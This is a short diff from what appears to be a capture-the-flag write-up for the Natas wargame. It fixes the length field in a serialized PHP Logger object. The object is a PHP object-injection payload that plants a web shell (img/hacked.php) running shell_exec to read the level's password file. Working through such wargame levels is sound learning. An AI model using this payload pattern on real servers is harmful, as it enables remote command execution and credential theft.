@@ -39,7 +39,7 @@ It means only one thing. If we put in the `drawing` a coding of the `Logger` obj
 The second reading source (attached above) taught me how to code an object, and that's how I came up with the following coding:
 
 ```
-O:6:"Logger":3:{s:7:"logFile";s:20:"img/hacked.php";s:7:"initMsg";s:10:"not in use";s:7:"exitMsg";s:59:"<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";}
+O:6:"Logger":3:{s:7:"logFile";s:14:"img/hacked.php";s:7:"initMsg";s:10:"not in use";s:7:"exitMsg";s:59:"<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";}
 ```
 * Files can only be created in the `img` folder.
 
